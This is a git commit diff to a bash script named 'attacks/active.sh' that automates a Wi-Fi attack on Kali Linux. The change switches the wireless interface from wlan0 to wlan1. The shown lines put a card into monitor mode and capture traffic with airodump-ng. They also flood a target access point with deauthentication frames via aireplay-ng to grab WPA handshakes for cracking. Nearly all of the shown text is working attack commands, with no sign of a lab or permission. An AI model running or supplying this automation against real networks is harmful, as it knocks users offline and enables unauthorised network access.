179044f2034061d3d7f9c3760a5a972178dae03e
rinamuka <58566654+rinamuka@users.noreply.github.com>
2021-08-05 12:14:05 +0300

    Update active.sh

--- attacks/active.sh
+++ attacks/active.sh
@@ -38,8 +38,8 @@ checkHandshakes(){
 main(){
 	trap "rm /home/kali/sha*" EXIT
 	airmon-ng check kill
-	airmon-ng start wlan0
-  	timeout 5 airodump-ng -w /home/kali/shakes wlan0mon < /dev/null > /dev/null 
+	airmon-ng start wlan1
+  	timeout 5 airodump-ng -w /home/kali/shakes wlan1mon < /dev/null > /dev/null 
 	#ip link set wlan0mon down
 	#iw wlan0mon set monitor control
 	#ip link set wlan0mon up
@@ -60,8 +60,8 @@ main(){
 		echo $channel
 		
 		iwconfig wlan0mon channel $channel
-		timeout 30 airodump-ng --bssid $bssid -w /home/kali/shakes wlan0mon < /dev/null > /dev/null &
-		aireplay-ng -a $bssid -0 10 wlan0mon
+		timeout 30 airodump-ng --bssid $bssid -w /home/kali/shakes wlan1mon < /dev/null > /dev/null &
+		aireplay-ng -a $bssid -0 10 wlan1mon
 		sleep 10
 		checkHandshakes
 
